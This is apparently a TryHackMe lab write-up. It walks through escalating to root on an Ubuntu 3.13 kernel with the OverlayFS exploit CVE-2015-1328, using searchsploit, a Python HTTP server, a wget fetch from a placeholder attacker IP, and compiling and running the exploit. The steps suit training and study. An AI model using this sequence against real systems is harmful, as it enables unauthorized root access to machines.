🔐 TryHackMe Write-Up: Linux Privilege Escalation via CVE-2015-1328
📋 Challenge Information

Parameter	Value
Platform	TryHackMe
Type	Privilege Escalation
Target OS	Ubuntu Linux
Kernel	3.13.0-24-generic
CVE	CVE-2015-1328
Exploit	37292.c (Exploit-DB)
🔍 Step 1: Reconnaissance — Checking Kernel Version
After gaining initial access to the target machine, I checked the kernel version:
bash
Copy code
uname -a
# or
uname -r
Result: 3.13.0-24-generic

🔎 Step 2: Vulnerability Research
Kernel version 3.13.x is vulnerable to CVE-2015-1328 (OverlayFS Local Privilege Escalation).
Vulnerability Description:

A vulnerability in the OverlayFS filesystem in Linux kernels before 3.19.0-21 allows local users to gain root privileges via improper permission checks when creating files in the upper filesystem layer.
Exploit-DB Link: https://www.exploit-db.com/exploits/37292

💾 Step 3: Downloading the Exploit
On the Attacker Machine (Kali/Local):
bash
Copy code
# Download exploit from Exploit-DB
searchsploit -m 37292

# Start HTTP server to transfer the file
python3 -m http.server 8080
On the Target Machine:
bash
Copy code
# Navigate to a writable directory
cd /tmp

# Download the exploit
wget http://<ATTACKER_IP>:8080/37292.c

⚙️ Step 4: Compilation and Execution
bash
Copy code
# Compile the exploit
gcc 37292.c -o exploit

# Make it executable
chmod +x exploit

# Run the exploit
./exploit

🎯 Step 5: Root Access Obtained
bash
Copy code
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)
✅ Success! Root privileges obtained!

📝 Quick Reference Commands

Action	Command
Check kernel version	uname -r
Start HTTP server	python3 -m http.server 8080
Download file	wget http://IP:PORT/file
Compile C code	gcc file.c -o output
Make executable	chmod +x file

* Always check the kernel version first: uname -a
* Use searchsploit to find exploits: searchsploit linux kernel 3.13
* The /tmp directory usually has write permissions for all users
* If gcc is not available on the target — compile on your machine (but consider the architecture: x86 vs x64!)
* Alternative tools for enumeration:
    * LinPEAS
    * Linux Exploit Suggester
    * LinEnum

🛠️ Tools Used
* searchsploit — for finding exploits
* Python HTTP server — for file transfer
* wget — for downloading files on target
* gcc — for compiling the exploit

Date: December 19, 2025 Author: Tomash Popov
